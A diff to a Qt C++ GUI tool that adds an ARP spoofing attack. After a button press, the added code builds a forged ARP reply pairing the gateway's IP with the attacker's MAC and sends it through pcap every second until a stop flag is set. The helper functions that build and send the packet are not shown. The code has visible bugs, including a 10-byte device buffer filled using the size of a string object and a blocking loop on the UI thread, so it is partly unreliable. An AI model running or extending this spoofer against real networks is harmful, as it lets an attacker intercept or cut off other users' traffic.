@@ -10,9 +10,13 @@
 #include "function.h"
 #include "parse.h"
 #include "rt_parse.h"
+#include "arp_attack.h"
 
 uint32_t ip;
 uint32_t subnetmask;
+uint8_t my_mac[6];
+struct info iface_info;
+int on = 1;
 
 MainWindow::MainWindow(QWidget *parent)
     : QMainWindow(parent)
@@ -20,6 +24,7 @@ MainWindow::MainWindow(QWidget *parent)
 {
     ui->setupUi(this);
     ui->attack_btn->setEnabled(0);
+    ui->stop_btn->setEnabled(0);
 }
 
 MainWindow::~MainWindow()
@@ -51,7 +56,6 @@ void MainWindow::on_check_btn_clicked()
     auto_iface_name_.sprintf("%s", auto_iface_name);
     ui->check_btn->setEnabled(0);
 
-    struct info iface_info;
     while(all_devs != nullptr){
         iface_info.name = all_devs->name;
         iface_info.desc = all_devs->description;
@@ -75,14 +79,54 @@ void MainWindow::on_check_btn_clicked()
 
         all_devs = all_devs->next;
         ch_ip.sprintf("%d.%d.%d.%d", (iface_info.ip)&0xFF, (iface_info.ip>>8)&0xFF, (iface_info.ip>>16)&0xFF, (iface_info.ip>>24)&0xFF);
-        ch_subnet.sprintf("%d.%d.%d.%d\n", (iface_info.subnetmask)&0xFF, (iface_info.subnetmask>>8)&0xFF, (iface_info.subnetmask>>16)&0xFF, (iface_info.subnetmask>>24)&0xFF);
+        ch_subnet.sprintf("%d.%d.%d.%d", (iface_info.subnetmask)&0xFF, (iface_info.subnetmask>>8)&0xFF, (iface_info.subnetmask>>16)&0xFF, (iface_info.subnetmask>>24)&0xFF);
 
         if(auto_iface_name_ == iface_info.name){
+            iface_info.gateway = inet_addr(auto_gateway_ip_.toUtf8().constData());
             ui->interface_browser->append(iface_info.name);
-            //ui->interface_browser->append(iface_info.desc);
             ui->interface_browser->append(ch_ip);
             ui->interface_browser->append(ch_subnet);
+            ui->interface_browser->append(auto_gateway_ip_);
+            break;
         }
     }
     ui->attack_btn->setEnabled(1);
+}
+
+
+void MainWindow::on_attack_btn_clicked()
+{
+    char dev[10] = {0, };
+    qsnprintf(dev, sizeof(iface_info.name), "%s", iface_info.name.toUtf8().constData());
+
+    getAttackerMAC(dev, my_mac);
+
+    unsigned char arp_spoofed_pkt[50] = {0, };
+    ARP_Packet * arp_pkt = (ARP_Packet *)malloc(sizeof(ARP_Packet));
+
+    make_arp_packet(iface_info.gateway, my_mac, arp_pkt);
+    memcpy(arp_spoofed_pkt, arp_pkt, sizeof(*arp_pkt));
+    ui->stop_btn->setEnabled(1);
+
+    char errbuf[PCAP_ERRBUF_SIZE];
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+
+    if (handle == NULL) {
+        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
+        return;
+    }
+    while(1){
+        if(on == 1){
+            start_attack(arp_spoofed_pkt, dev, handle);
+        }else if(on == 0){
+            break;
+        }
+        usleep(1000000);
+    }
+
+}
+
+void MainWindow::on_stop_btn_clicked()
+{
+    on = 0;
 }
